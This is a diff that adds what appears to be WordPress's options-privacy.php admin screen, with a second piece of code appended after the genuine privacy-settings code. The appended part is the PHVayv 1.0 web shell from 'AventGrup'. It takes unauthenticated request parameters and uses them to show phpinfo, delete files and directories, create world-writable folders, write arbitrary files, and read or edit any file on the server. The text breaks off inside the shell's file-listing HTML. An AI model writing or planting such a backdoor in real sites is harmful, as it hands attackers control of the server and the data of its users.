@@ -1,0 +1,894 @@
+<?php
+/**
+ * Privacy Settings Screen.
+ *
+ * @package WordPress
+ * @subpackage Administration
+ */
+
+/** WordPress Administration Bootstrap */
+require_once __DIR__ . '/admin.php';
+
+if ( ! current_user_can( 'manage_privacy_options' ) ) {
+	wp_die( __( 'Sorry, you are not allowed to manage privacy options on this site.' ) );
+}
+
+if ( isset( $_GET['tab'] ) && 'policyguide' === $_GET['tab'] ) {
+	require_once dirname( __FILE__ ) . '/privacy-policy-guide.php';
+	return;
+}
+
+add_filter(
+	'admin_body_class',
+	function( $body_class ) {
+		$body_class .= ' privacy-settings ';
+
+		return $body_class;
+	}
+);
+
+$action = isset( $_POST['action'] ) ? $_POST['action'] : '';
+
+if ( ! empty( $action ) ) {
+	check_admin_referer( $action );
+
+	if ( 'set-privacy-page' === $action ) {
+		$privacy_policy_page_id = isset( $_POST['page_for_privacy_policy'] ) ? (int) $_POST['page_for_privacy_policy'] : 0;
+		update_option( 'wp_page_for_privacy_policy', $privacy_policy_page_id );
+
+		$privacy_page_updated_message = __( 'Privacy Policy page updated successfully.' );
+
+		if ( $privacy_policy_page_id ) {
+			/*
+			 * Don't always link to the menu customizer:
+			 *
+			 * - Unpublished pages can't be selected by default.
+			 * - `WP_Customize_Nav_Menus::__construct()` checks the user's capabilities.
+			 * - Themes might not "officially" support menus.
+			 */
+			if (
+				'publish' === get_post_status( $privacy_policy_page_id )
+				&& current_user_can( 'edit_theme_options' )
+				&& current_theme_supports( 'menus' )
+			) {
+				$privacy_page_updated_message = sprintf(
+					/* translators: %s: URL to Customizer -> Menus. */
+					__( 'Privacy Policy page setting updated successfully. Remember to <a href="%s">update your menus</a>!' ),
+					esc_url( add_query_arg( 'autofocus[panel]', 'nav_menus', admin_url( 'customize.php' ) ) )
+				);
+			}
+		}
+
+		add_settings_error( 'page_for_privacy_policy', 'page_for_privacy_policy', $privacy_page_updated_message, 'success' );
+	} elseif ( 'create-privacy-page' === $action ) {
+
+		if ( ! class_exists( 'WP_Privacy_Policy_Content' ) ) {
+			require_once ABSPATH . 'wp-admin/includes/class-wp-privacy-policy-content.php';
+		}
+
+		$privacy_policy_page_content = WP_Privacy_Policy_Content::get_default_content();
+		$privacy_policy_page_id      = wp_insert_post(
+			array(
+				'post_title'   => __( 'Privacy Policy' ),
+				'post_status'  => 'draft',
+				'post_type'    => 'page',
+				'post_content' => $privacy_policy_page_content,
+			),
+			true
+		);
+
+		if ( is_wp_error( $privacy_policy_page_id ) ) {
+			add_settings_error(
+				'page_for_privacy_policy',
+				'page_for_privacy_policy',
+				__( 'Unable to create a Privacy Policy page.' ),
+				'error'
+			);
+		} else {
+			update_option( 'wp_page_for_privacy_policy', $privacy_policy_page_id );
+
+			wp_redirect( admin_url( 'post.php?post=' . $privacy_policy_page_id . '&action=edit' ) );
+			exit;
+		}
+	}
+}
+
+// If a Privacy Policy page ID is available, make sure the page actually exists. If not, display an error.
+$privacy_policy_page_exists = false;
+$privacy_policy_page_id     = (int) get_option( 'wp_page_for_privacy_policy' );
+
+if ( ! empty( $privacy_policy_page_id ) ) {
+
+	$privacy_policy_page = get_post( $privacy_policy_page_id );
+
+	if ( ! $privacy_policy_page instanceof WP_Post ) {
+		add_settings_error(
+			'page_for_privacy_policy',
+			'page_for_privacy_policy',
+			__( 'The currently selected Privacy Policy page does not exist. Please create or select a new page.' ),
+			'error'
+		);
+	} else {
+		if ( 'trash' === $privacy_policy_page->post_status ) {
+			add_settings_error(
+				'page_for_privacy_policy',
+				'page_for_privacy_policy',
+				sprintf(
+					/* translators: %s: URL to Pages Trash. */
+					__( 'The currently selected Privacy Policy page is in the Trash. Please create or select a new Privacy Policy page or <a href="%s">restore the current page</a>.' ),
+					'edit.php?post_status=trash&post_type=page'
+				),
+				'error'
+			);
+		} else {
+			$privacy_policy_page_exists = true;
+		}
+	}
+}
+
+$parent_file = 'options-general.php';
+
+wp_enqueue_script( 'privacy-tools' );
+
+require_once ABSPATH . 'wp-admin/admin-header.php';
+
+?>
+<div class="privacy-settings-header">
+	<div class="privacy-settings-title-section">
+		<h1>
+			<?php _e( 'Privacy' ); ?>
+		</h1>
+	</div>
+
+	<nav class="privacy-settings-tabs-wrapper hide-if-no-js" aria-label="<?php esc_attr_e( 'Secondary menu' ); ?>">
+		<a href="<?php echo esc_url( admin_url( 'options-privacy.php' ) ); ?>" class="privacy-settings-tab active" aria-current="true">
+			<?php
+			/* translators: Tab heading for Site Health Status page. */
+			_ex( 'Settings', 'Privacy Settings' );
+			?>
+		</a>
+
+		<a href="<?php echo esc_url( admin_url( 'options-privacy.php?tab=policyguide' ) ); ?>" class="privacy-settings-tab">
+			<?php
+			/* translators: Tab heading for Site Health Status page. */
+			_ex( 'Policy Guide', 'Privacy Settings' );
+			?>
+		</a>
+	</nav>
+</div>
+
+<hr class="wp-header-end">
+
+<div class="notice notice-error hide-if-js">
+	<p><?php _e( 'The Privacy Settings require JavaScript.' ); ?></p>
+</div>
+
+<div class="privacy-settings-body hide-if-no-js">
+	<h2><?php _e( 'Privacy Settings' ); ?></h2>
+	<p>
+		<?php _e( 'As a website owner, you may need to follow national or international privacy laws. For example, you may need to create and display a Privacy Policy.' ); ?>
+		<?php _e( 'If you already have a Privacy Policy page, please select it below. If not, please create one.' ); ?>
+	</p>
+	<p>
+		<?php _e( 'The new page will include help and suggestions for your Privacy Policy.' ); ?>
+		<?php _e( 'However, it is your responsibility to use those resources correctly, to provide the information that your Privacy Policy requires, and to keep that information current and accurate.' ); ?>
+	</p>
+	<p>
+		<?php _e( 'After your Privacy Policy page is set, we suggest that you edit it.' ); ?>
+		<?php _e( 'We would also suggest reviewing your Privacy Policy from time to time, especially after installing or updating any themes or plugins. There may be changes or new suggested information for you to consider adding to your policy.' ); ?>
+	</p>
+	<p>
+		<?php
+		if ( $privacy_policy_page_exists ) {
+			$edit_href = add_query_arg(
+				array(
+					'post'   => $privacy_policy_page_id,
+					'action' => 'edit',
+				),
+				admin_url( 'post.php' )
+			);
+			$view_href = get_permalink( $privacy_policy_page_id );
+			?>
+				<strong>
+				<?php
+				if ( 'publish' === get_post_status( $privacy_policy_page_id ) ) {
+					printf(
+						/* translators: 1: URL to edit Privacy Policy page, 2: URL to view Privacy Policy page. */
+						__( '<a href="%1$s">Edit</a> or <a href="%2$s">view</a> your Privacy Policy page content.' ),
+						esc_url( $edit_href ),
+						esc_url( $view_href )
+					);
+				} else {
+					printf(
+						/* translators: 1: URL to edit Privacy Policy page, 2: URL to preview Privacy Policy page. */
+						__( '<a href="%1$s">Edit</a> or <a href="%2$s">preview</a> your Privacy Policy page content.' ),
+						esc_url( $edit_href ),
+						esc_url( $view_href )
+					);
+				}
+				?>
+				</strong>
+			<?php
+		}
+		printf(
+			/* translators: 1: Privacy Policy guide URL, 2: Additional link attributes, 3: Accessibility text. */
+			__( 'Need help putting together your new Privacy Policy page? <a href="%1$s" %2$s>Check out our Privacy Policy guide%3$s</a> for recommendations on what content to include, along with policies suggested by your plugins and theme.' ),
+			esc_url( admin_url( 'options-privacy.php?tab=policyguide' ) ),
+			'',
+			''
+		);
+		?>
+	</p>
+	<hr>
+	<?php
+	$has_pages = (bool) get_posts(
+		array(
+			'post_type'      => 'page',
+			'posts_per_page' => 1,
+			'post_status'    => array(
+				'publish',
+				'draft',
+			),
+		)
+	);
+	?>
+	<table class="form-table tools-privacy-policy-page" role="presentation">
+		<tr>
+			<th scope="row">
+				<label for="create-page">
+				<?php
+				if ( $has_pages ) {
+					_e( 'Create a new Privacy Policy Page' );
+				} else {
+					_e( 'There are no pages.' );
+				}
+				?>
+				</label>
+			</th>
+			<td>
+				<form class="wp-create-privacy-page" method="post" action="">
+					<input type="hidden" name="action" value="create-privacy-page" />
+					<?php
+					wp_nonce_field( 'create-privacy-page' );
+					submit_button( __( 'Create' ), 'secondary', 'submit', false, array( 'id' => 'create-page' ) );
+					?>
+				</form>
+			</td>
+		</tr>
+		<?php if ( $has_pages ) : ?>
+		<tr>
+			<th scope="row">
+				<label for="page_for_privacy_policy">
+					<?php
+					if ( $privacy_policy_page_exists ) {
+						_e( 'Change your Privacy Policy page' );
+					} else {
+						_e( 'Select a Privacy Policy page' );
+					}
+					?>
+				</label>
+			</th>
+			<td>
+				<form method="post" action="">
+					<input type="hidden" name="action" value="set-privacy-page" />
+					<?php
+					wp_dropdown_pages(
+						array(
+							'name'              => 'page_for_privacy_policy',
+							'show_option_none'  => __( '&mdash; Select &mdash;' ),
+							'option_none_value' => '0',
+							'selected'          => $privacy_policy_page_id,
+							'post_status'       => array( 'draft', 'publish' ),
+						)
+					);
+
+					wp_nonce_field( 'set-privacy-page' );
+
+					submit_button( __( 'Use This Page' ), 'primary', 'submit', false, array( 'id' => 'set-page' ) );
+					?>
+				</form>
+			</td>
+		</tr>
+		<?php endif; ?>
+	</table>
+</div>
+<?php
+
+require_once ABSPATH . 'wp-admin/admin-footer.php';
+<? if($sistembilgisi > "") {phpinfo();} else { ?>
+
+
+<?$fistik=PHVayv;?>
+
+
+<?if ($sildos>"") {unlink("$dizin/$sildos");} ?>
+
+<?if ($dizin== ""){$dizin=realpath('.');}{$dizin=realpath($dizin);}?>
+
+<?if ($silklas > ""){rmdir($silklas);}?>
+
+<?if ($yeniklasor > "") {mkdir("$dizin/$duzenx2",777);}?>
+
+
+
+<?if ($yenidosya == "1") {
+$baglan=fopen("$dizin/$duzenx2",'w');
+fwrite($baglan,$duzenx);
+fclose($baglan);}
+?>
+
+
+
+
+<?if ($duzkaydet > "") {
+
+$baglan=fopen($duzkaydet,'w');
+fwrite($baglan,$duzenx);
+fclose($baglan);}
+?>
+
+
+
+
+<?if ($yenklas>"") {;?>
+<body topmargin="0" leftmargin="0">
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan </span></font>
+        <font face="Verdana" style="font-size: 8pt">Dizin</font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
+            <td width="65">
+            &nbsp;</td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+</table>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber30" height="184">
+  <tr>
+    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#9F9F9F" align="center" height="144">
+    <form method="POST" action="<?echo "$fistik.php?yeniklasor=1&dizin=$dizin"?>" 
+      <p align="center"><br>
+      <font
+                color="#FFFFFF" size="1" face="Arial">
+<input
+                type="text" size="37" maxlength="32"
+                name="duzenx2" value="Klasör Adý"
+                class="search"
+                onblur="if (this.value == '') this.value = 'Kullanýcý'"
+                onfocus="if (this.value == 'Kullanýcý') this.value=''"
+                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"></font></p>
+<p align="center">
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Kaydet"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span></span><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+&nbsp;</font></b></p>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000" align="center" height="19">
+    &nbsp;</td>
+  </tr>
+  </table>
+  
+
+
+<? } else { ?>
+
+
+
+
+<?if ($yendos>"") {;
+?>
+
+<body topmargin="0" leftmargin="0">
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan </span></font>
+        <font face="Verdana" style="font-size: 8pt">Dizin</font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
+            <td width="65">
+            &nbsp;</td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+</table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="495">
+  <tr>
+    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#9F9F9F" align="center" height="455">
+    <form method="POST" action="<?echo "$fistik.php?yenidosya=1&dizin=$dizin"?>" 
+      <p align="center"><br>
+      <font
+                color="#FFFFFF" size="1" face="Arial">
+<input
+                type="text" size="50" maxlength="32"
+                name="duzenx2" value="Dosya Adý"
+                class="search"
+                onblur="if (this.value == '') this.value = 'Kullanýcý'"
+                onfocus="if (this.value == 'Kullanýcý') this.value=''"
+                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"></font></p>
+<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
+          <textarea name="duzenx" 
+          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
+        
+          
+          rows="24" cols="122" wrap="OFF">XXXX</textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+<br>
+</font></b>
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Kaydet"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span><br>
+&nbsp;</p>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000" align="center" height="19">
+    &nbsp;</td>
+  </tr>
+  </table>
+  
+
+
+<? } else { ?>
+
+
+
+
+
+<?if ($duzenle>"") {; 
+?>
+
+
+
+
+<body topmargin="0" leftmargin="0">
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="1">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="1"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Dosya</span></font></td>
+        <td bgcolor="#D6D6D6" height="1">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4" height="19">
+          <tr>
+            <td width="1" height="19"></td>
+            <td rowspan="2" height="19"><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin/$duzenle"?></font></td>
+          </tr>
+          <tr>
+            <td width="1" height="1"></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+</table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
+  <tr>
+    <td width="100%" bgcolor="#000000">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#9F9F9F">
+    <form method="POST" action="<?echo "PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin"?>" name="kaypos">
+<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
+          <br>
+          <textarea name="duzenx" 
+          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
+        
+          
+          rows="24" cols="122" wrap="OFF"><?$baglan=fopen("$dizin/$duzenle",'r');
+while(! feof ( $baglan ) ){
+$okunan=fgets($baglan,1024);
+echo $okunan;
+} fclose($baglan); ?></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+<br>
+</font></b>
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Kaydet"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span></p>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000">
+    &nbsp;</td>
+  </tr>
+  </table>
+
+
+
+
+
+
+
+
+
+
+
+<?
+} else {
+?>
+
+
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="tr">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<title>PHVayv 1.0</title>
+</head>
+
+<body topmargin="0" leftmargin="0">
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+
+
+
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Klasör</span></font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
+            <td width="65">
+            <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" height="13">
+              <tr>
+                <td width="100%" bgcolor="#B7B7B7" bordercolor="#9F9F9F" height="13"
+                onmouseover='this.style.background="D9D9D9"'
+                onmouseout='this.style.background="9F9F9F"'
+                style="CURSOR: hand"
+                
+                
+                
+                
+                >
+                <p align="center"><font face="Verdana" style="font-size: 8pt">
+
+
+
+
+
+
+                <a href="<?echo "$fistik.php?dizin=$dizin/../"?>" style="text-decoration: none">
+                <font color="#000000">Üst Klasör</font></a></font></td>
+
+              </tr>
+            </table>
+            </td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+
+
+
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3" height="21">
+  <tr>
+    <td width="625" bgcolor="#000000"><span style="font-size: 2pt">&nbsp;</span></td>
+  </tr>
+  <tr>
+    <td bgcolor="#000000" height="20">
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#000000" id="AutoNumber23" bgcolor="#A3A3A3" width="373" height="19">
+      <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber26">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" 
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+        
+        height="19" bordercolor="#000000">
+        <span style="font-weight: 700">
+        <font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+        <a color="#9F9F9F" target="_blank" href="<?echo "$fistik.php?sistembilgisi=1";?>" style="text-decoration: none"><font color="#9F9F9F">Sistem Bilgisi</font></a></font></font></span></td>
+          </tr>
+        </table>
+        </td>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber27">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19" 
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+        bordercolor="#000000">
+        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
+        <a href="<?echo "$fistik.php?yenklas=1&dizin=$dizin";?>" style="text-decoration: none">
+        <font color="#9F9F9F">Yeni Klasör</font></a></font></td>
+          </tr>
+        </table>
+        </td>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber28">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19"
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+		bordercolor="#000000">
+        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
+        <a href="<?echo "$fistik.php?yendos=1&dizin=$dizin";?>" style="text-decoration: none"><font color="#9F9F9F">Yeni Dosya</font></a> </font></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+  </table>
+
+  
+
+
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber7" height="17">
+  <tr>
+    <td width="30" height="17" bgcolor="#9F9F9F">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Tür</font></td>
+    <td height="17" bgcolor="#9F9F9F">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Dosya 
+    Adý</font></td>
+    <td width="122" height="17" bgcolor="#9F9F9F">
+    <p align="center">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Ýþlem</font></td>
+  </tr>
+</table>
+
+<?
+if ($sedat=@opendir($dizin)){
+while (($ekinci=readdir ($sedat))){
+if (is_dir("$dizin/$ekinci")){
+?>
+
+<? if ($ekinci=="." or  $ekinci=="..") {
+} else {
+?>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="17">
+  <tr>
+    <td width="30" height="17" bgcolor="#808080">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif"></td>
+    <td height="17" bgcolor="#C4C4C4">
+    <font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$ekinci" ?></font></td>
+    <td width="61" height="17" bgcolor="#C4C4C4" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber15" height="20">
+      <tr>
+        <td width="100%" bgcolor="#A3A3A3"
+        onmouseover="this.style.background='#BBBBBB'"
